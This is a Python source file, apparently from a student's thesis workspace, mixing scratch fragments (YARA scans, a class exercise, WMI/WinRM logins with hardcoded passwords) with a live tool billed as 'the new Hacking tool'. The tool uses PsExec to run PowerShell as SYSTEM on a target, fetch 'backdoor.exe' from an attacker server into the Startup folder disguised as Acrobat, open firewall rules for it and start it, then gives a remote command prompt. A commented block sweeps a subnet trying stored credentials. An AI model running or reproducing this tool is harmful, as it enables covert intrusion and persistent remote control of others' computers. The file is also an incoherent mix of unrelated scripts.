from pypsexec.client import Client
import socket
# import yara
# x = yara.compile(r"C:\Users\john\Desktop\new.yara")
# with open(r"C:\Users\john\Desktop\dist\tests11.exe","rb") as f:
#     print(x.match(data=f.read()))
#
# import json
# with open(r"C:\Users\john\Desktop\workSpace\thesis\pids.json","rb") as f:
#     pids = json.load(f)
#     f.close()
#     print(pids["pids"])

    #yara.Error: could not open file "C:\Users\john\Desktop\dist\test11.exe")
# import psutil
# import yara
# x = yara.load(r"C:\Users\john\Desktop\workSpace\thesis\saved_yara_file.yara")
# for myProcess in psutil.process_iter():
#     try:
#         zz = x.match(pid=myProcess.pid)
#         if zz:
#             print("YEAH")
#     except:
#         print("ERROR")
#         continue
#     #print(myProcess.pid)
#     #print(type(myProcess.pid))





#
#
# class oxhmata():
#     def __init__(self,xroma,baros,pinakides):
#         self.xroma=xroma
#         self.baros=baros
#         self.pinakides = pinakides
#     def print_me(self):
#         print(self.xroma, "--",self.baros,"--",self.pinakides)
#
# class autokinhta(oxhmata):
#     def __init__(self, xroma, baros,pinakides, megathos):
#         super().__init__(xroma,baros,pinakides)
#         self.megethos = megathos
#         #super().__init__(xroma, baros, pinakides)
#
# class mhxanes(oxhmata):
#     def __init__(self, xroma, baros,pinakides, timoni):
#         super().__init__(xroma,baros,pinakides)
#         self.timoni = timoni
#
# cars = []
# moto = []
# cars.append(autokinhta("mple",120,"AK1243",35))
# b = mhxanes("roz",10,"AK234","harley")
# moto.append(b)

# import wmi
# ip = "192.168.1.10"
# username = "IEUser"
# password = "Passw0rd!"
# from socket import *
# try:
#     print ("Establishing connection to %s" %ip)
#     connection = wmi.WMI(ip, user=username, password=password)
#     print ("Connection established")
# except wmi.x_wmi as e:
#     print ("Your Username and Password of "+getfqdn(ip)+" are wrong.",e)
#

#
# # import win32api
# # import win32net
# # ip = '192.168.1.10'
# # username = 'john'
# # password = 'Passw0rd!'
# #
# # use_dict={}
# # use_dict['remote']='\\\\192.168.1.10\C$'
# # use_dict['password']=password
# # use_dict['username']=username
# # win32net.NetUseAdd(None, 2, use_dict)
# #
# #
# #
# #
# #
# #
# # import winrm
# # sess = winrm.Session('https://192.168.1.10', auth=('IEUser', 'Passw0rd!'), transport='kerberos')
# # # result = sess.run_cmd('ipconfig', ['/all'])

from pypsexec.client import Client
import argparse
import http.server
import threading
import sys
import os
import time
import socket
import asyncio
import sys

# def run(server_class=http.server.HTTPServer, handler_class=http.server.BaseHTTPRequestHandler):
#     server_address = ('', 8000)
#     httpd = server_class(server_address, handler_class)
#     httpd.serve_forever()

class EchoClientProtocol(asyncio.Protocol):
    def __init__(self, message, loop):
        self.message = message
        self.loop = loop

    def connection_made(self, transport):
        transport.write(self.message.encode())
        print('Data sent: {!r}'.format(self.message))

    def data_received(self, data):
        #print('1Data received: {!r}'.format(data.decode())) raw
        print(f'Data received: {data.decode()}')

    def connection_lost(self, exc):
        print('The server closed the connection')
        print('Stop the event loop')
        self.loop.stop()


def main(args):
    # t1 = threading.Thread(target=run())
    # t1.start()
    if args.new is True:
        c = Client(args.ip, username=args.username, password=args.password)
        c.connect()
        try:
            c.create_service()
            print("Connection Established Starting Poisoning")
            stdout, stderr, rc = c.run_executable("powershell.exe" ,arguments = "-Command \"& {Invoke-WebRequest http://"+args.server+":8000/backdoor.exe -OutFile C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe}\"", use_system_account=True)
            print("File Send ",stdout.decode("utf-8"), stderr.decode("utf-8"), rc)
            stdout, stderr, rc = c.run_executable("powershell.exe" ,arguments = "-Command \"&  {New-NetFirewallRule -DisplayName \""+args.rule+"\" -Direction Inbound -Program C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe -RemoteAddress LocalSubnet -Action Allow}\"", use_system_account=True)
            print("Firewall INBOUNT Updated", stdout.decode("utf-8"), stderr.decode("utf-8"), rc)
            stdout1, stderr1, rc1 = c.run_executable("powershell.exe",arguments = "-Command \"& {New-NetFirewallRule -DisplayName \""+args.rule+"\" -Direction Outbound -Program C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe -RemoteAddress LocalSubnet -Action Allow}\"", use_system_account=True)
            print("Firewall OUTBOUNT Updated", stdout1.decode("utf-8"), stderr1.decode("utf-8"), rc1)
            stdout1, stderr1, rc1 = c.run_executable("powershell.exe",arguments = "-Command \"& {Start-Process -FilePath \"C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe\"}\"", use_system_account=True)
            print("Starting BackDoor", stdout1.decode("utf-8"), stderr1.decode("utf-8"), rc1)

            c.remove_service()
            c.disconnect()
            time.sleep(2)
            sys.exit()

        except Exception as e:
            c.remove_service()
            c.disconnect()
            print(e)
            time.sleep(2)
            sys.exit()
    if args.connect is True:
        print("OK")
        loop = asyncio.get_event_loop()
        while True:
            message = input(">>")
            if message != "q":
                try:
                    coro = loop.create_connection(lambda: EchoClientProtocol(message, loop), args.ip, 8888)
                    loop.run_until_complete(coro)
                    loop.run_forever()
                except Exception as ex:
                    print("Cannot Connect to Remote Server Exception: ",ex)
            else:
                loop.close()
                sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Hello to the new Hacking tool')
    parser.add_argument('-i', '--ip', dest='ip', default=None, required=True, help='ip of the target')
    parser.add_argument('-u', '--username', dest='username', default=True, required=True, help='Username of the target')
    parser.add_argument('-p', '--password', dest='password', default=None, required=True, help='Password of the target')
    parser.add_argument('-n', '--new', dest='new', default=None, required=False, action='store_true', help='New Connection')
    parser.add_argument('-c', '--connect', dest='connect', default=True, required=False, action='store_true' ,help='Connect to remote PC')
    parser.add_argument('-e', '--executable', dest='executable', default="Acrobat", required=False ,help='Name of executable Default Acrobat')
    parser.add_argument('-r', '--rule', dest='rule', default="Acrobat_Updater", required=False ,help='Name of filewall Rule Default Acrobat_Updater')
    parser.add_argument('-s', '--server', dest='server', default=None, required=True ,help='Server IP')

    args = parser.parse_args()

    try:
        socket.inet_aton(args.ip)
        socket.inet_aton(args.server)
        # legal
    except socket.error:
        print("NOT Legal IP")
        sys.exit(0)
    #print(args.new, args.connect)
    if args.connect is True and args.new is True:
        args.connect = False
    print (args.executable, args.rule)
    main(args)

# Not legal


#Invoke-WebRequest http://192.168.0.150:8000/hello.bat -OutFile hello.bat
#powershell.exe -Command "& {Write-Host hello}"
from subprocess import check_output
import subprocess
import os
# proc = subprocess.check_output("cmd.exe /C dir c:")
# proc1 = subprocess.check_output("powershell.exe -Command \"& {Write-Host h1ello}\" ")
# #stdout, stderr = proc.communicate()
# print(proc1)
# print(os.getcwd())
# cmd = subprocess.Popen("dir",shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
# print(os.getcwd())
# print(cmd.stdout.read())
# import socket
# ips = []
# z = socket.getaddrinfo(socket.gethostname(), None)
# for i in z:
#     print(type(i))
#     ip = i[4][0]
#     try:
#         socket.inet_aton(ip)
#         ips.append(ip)
#     except:
#         print("no")
#         continue
# L = [1,4,6,40,45,67,69,82,150,155,170,222,223,237,239,241,245,251,252,253,254]
# def find_ip(L):
#     for i in  L:
#         ip = "192.168.0."+str(i)
#         cmd = subprocess.Popen("ping -n 1 "+ip, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#
#         x = cmd.stdout.read().decode("utf-8")
#         x.replace("\n","")
#         x.replace("\t","")
#         print(ip)
#         if "100% loss" not in x:
#             try:
#                 print("found",ip)
#                 c = Client(ip, username="CHRISTINA STAMOULI", password="christinaki")
#                 c.connect()
#                 try:
#                     print(ip)
#                     c.create_service()
#                     stdout, stderr, rc = c.run_executable("cmd.exe", arguments="/c dir c:\\")
#                 except Exception as e:
#
#                     print(e)
#                     continue
#             except Exception as err:
#                 print(err)
# for i in L:
#     print(socket.gethostbyaddr("192.168.0."+str(i)))
